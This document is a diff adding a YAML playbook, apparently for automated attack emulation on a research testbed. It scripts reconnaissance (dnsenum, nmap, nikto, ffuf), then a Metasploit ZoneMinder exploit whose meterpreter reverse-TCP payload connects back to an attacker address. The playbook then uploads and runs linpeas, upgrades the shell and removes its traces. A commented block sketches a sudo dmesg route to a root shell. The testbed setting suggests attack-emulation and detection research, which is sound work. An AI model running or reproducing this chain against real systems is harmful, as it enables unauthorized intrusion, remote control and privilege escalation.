@@ -1,0 +1,107 @@
+###
+msf_config:
+  password: hackhelfer
+  server: localhost
+
+vars:
+  $SERVER_ADDRESS: 192.42.0.254
+  $ATTACKER_ADDRESS: 192.42.1.58
+  $DNS_SERVER: 192.42.0.233
+  $DOMAIN: aecid-testbed.com
+  $USER: aecid
+  $DNS_LIST: /usr/local/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+commands:
+  - type: shell
+    cmd: 'echo "Target:  $SERVER_ADDRESS"'
+
+  - type: shell
+    cmd: dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN
+
+  - type: shell
+    cmd: nmap $SERVER_ADDRESS
+
+  - type: shell
+    cmd: "nikto -host $SERVER_ADDRESS"
+
+  - type: shell
+    cmd: "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+
+  - type: msf-module
+    cmd: exploit/unix/webapp/zoneminder_snapshots
+    creates_session: "foothold"
+    options:
+      RHOSTS: 192.42.0.254
+    payload_options:
+      LHOST: 192.42.1.58
+    payload: cmd/unix/python/meterpreter/reverse_tcp
+
+
+  - type: msf-session
+    stdapi: True
+    session: "foothold"
+    cmd: cd /tmp
+
+  - type: msf-session
+    session: "foothold"
+    cmd: upload /home/$USER/linpeas.sh
+
+  - type: msf-session
+    cmd: shell
+    session: "foothold"
+
+
+  - type: msf-session
+    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+    session: "foothold"
+
+  - type: msf-session
+    cmd: export SHELL=bash
+    session: "foothold"
+
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+    session: "foothold"
+
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+    session: "foothold"
+
+  - type: msf-session
+    cmd: chmod +x linpeas.sh
+    session: "foothold"
+
+  - type: msf-session
+    cmd: ./linpeas.sh
+    session: "foothold"
+
+  - type: msf-session
+    cmd: rm linpeas.sh
+    session: "foothold"
+
+      #
+      #  - type: msf-session
+      #    cmd: sudo -l
+      #
+      #  - type: msf-session
+      #    write: True
+      #    cmd: "sudo dmesg -H"
+      #
+      #  - type: msf-session
+      #    write: True
+      #    cmd: "!/bin/bash\r\n"
+      #
+      #  - type: msf-session
+      #    cmd: id
+      #
+      #  - type: msf-session
+      #    cmd: ls -l /root
+      #
+  - type: msf-session
+    cmd: exit
+    session: "foothold"
+
+  - type: msf-module
+    cmd: auxiliary/scanner/portscan/tcp
+    options:
+      RHOSTS: 192.42.0.254
